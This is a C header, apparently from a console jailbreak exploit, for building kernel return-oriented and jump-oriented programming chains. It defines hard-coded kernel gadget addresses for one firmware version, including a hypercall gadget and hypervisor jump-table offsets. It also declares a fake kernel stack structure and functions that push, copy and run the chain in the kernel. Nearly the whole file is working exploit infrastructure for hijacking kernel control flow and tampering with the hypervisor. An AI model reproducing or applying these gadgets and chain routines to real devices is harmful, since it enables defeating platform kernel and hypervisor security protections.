#ifndef KROP_H
#define KROP_H

#include <pthread.h>
#include <sys/types.h>

#define KROP_GADGET_200_RET                         ktext(0x167241) // ret
#define KROP_GADGET_200_INFLOOP                     ktext(0x263BD1) // jmp 0
#define KROP_GADGET_200_HYPERCALL_SET_CPUID_PS4     ktext(0xADF680) // mov eax, 4 ; vmmcall ; ret
#define KROP_GADGET_200_RETURN_ADDR                 ktext(0xADFCEF) // hypercall 1 handler
#define KROP_GADGET_200_POP_RDI                     ktext(0x1A6878) // pop rdi ; ret
#define KROP_GADGET_200_POP_RSI                     ktext(0x167430) // pop rsi ; ret
#define KROP_GADGET_200_POP_RDX                     ktext(0x25C034) // pop rdx ; ret
#define KROP_GADGET_200_POP_RAX                     ktext(0x1C34D0) // pop rax ; ret
#define KROP_GADGET_200_POP_RBX                     ktext(0x172C9F) // pop rbx ; ret
#define KROP_GADGET_200_ADD_RAX_RDX                 ktext(0x201F99) // add rax, rdx ; ret
#define KROP_GADGET_200_MOV_R9_QWORD_PTR_RDI_48h    ktext(0x672787) // mov r9, qword ptr [rdi + 0x48] ; jmp rax
#define KROP_GADGET_200_POP_R12                     ktext(0x62CC31) // pop r12 ; ret
#define KROP_GADGET_200_ADD_RAX_RDX                 ktext(0x201F99) // add rax, rdx ; ret
#define KROP_GADGET_200_MOV_QWORD_PTR_RDI_RSI       ktext(0x3B2A96) // mov qword ptr [rdi], rsi ; ret
#define KROP_GADGET_200_POP_RSP                     ktext(0x20F3F0) // pop rsp ; ret
#define KROP_GADGET_200_MOV_RAX_QWORD_PTR_RAX       ktext(0x16B590) // mov rax, qword ptr [rax] ; ret
#define KROP_GADGET_200_MOV_QWORD_PTR_RAX_0         ktext(0x16B737) // mov qword ptr [rax], 0 ; ret
#define KROP_GADGET_200_SETJMP                      ktext(0x2488F0)
#define KROP_GADGET_200_LONGJMP                     ktext(0x248920)
#define KROP_GADGET_200_JOP1                        ktext(0xB5C7BC) // mov rdi, qword ptr [rsi] ; add rcx, r12 ; jmp rcx
#define KROP_GADGET_200_JOP2                        ktext(0x21A5AB) // call r9 ; lea rax, qword ptr [rip + 0x22745bb] ; mov rdi, rbx ; mov esi, 0x10 ; call qword ptr [rax]

#define KROP_GADGET_200_HV_JMP_TABLE                ktext(0x245BAB0)
#define KROP_GADGET_200_HV_JMP_TABLE_HYPERCALL_ENT  KROP_GADGET_200_HV_JMP_TABLE + 0x70
#define KROP_GADGET_200_DATA_CAVE                   ktext(0x248E7AC)
#define KROP_GADGET_200_FUNC_PTR                    ktext(0x248EB70)
#define KROP_GADGET_200_JOP1_OFFSET_FROM_JMP_TABLE  KROP_GADGET_200_JOP1 - KROP_GADGET_200_HV_JMP_TABLE
#define KROP_GADGET_200_JOP2_OFFSET_FROM_JMP_TABLE  KROP_GADGET_200_JOP2 - KROP_GADGET_200_HV_JMP_TABLE

#define KROP_DATA_CAVE_200_SAVECTX                  KROP_GADGET_200_DATA_CAVE + 0x4
#define KROP_DATA_CAVE_200_ROPCTX                   KROP_GADGET_200_DATA_CAVE + 0x44
#define KROP_DATA_CAVE_200_RSI_PTR                  KROP_GADGET_200_DATA_CAVE + 0x84
#define KROP_DATA_CAVE_200_ROP_CHAIN                KROP_GADGET_200_DATA_CAVE + 0x8C

struct krop_manage
{
    int core;
    int done;
    int pipe_fds[2];
    pthread_t thread;
    uint64_t thread_kstack;
    uint64_t tag1;
    uint64_t tag2;
    uint64_t kstack_orig_ret_addr;
    uint64_t kstack_orig_arg;
    uint64_t kstack_ret_addr_offset;
    uint64_t kstack_fake_stack_offset;
    char fake_stack[0x1000];
    char *fake_stack_cur;
};

struct krop_manage *create_krop_chain();
void krop_push(struct krop_manage *krop, uint64_t val);
void krop_push_write8(struct krop_manage *krop, uint64_t dest, uint64_t val);
void krop_push_exit(struct krop_manage *krop);
void krop_push_infloop(struct krop_manage *krop);
void krop_copy_kernel(struct krop_manage *krop);
void krop_run(struct krop_manage *krop);
void krop_dump_fake_stack(struct krop_manage *krop, int in_kernel);
void krop_dump_real_stack(struct krop_manage *krop);

#endif // KROP_H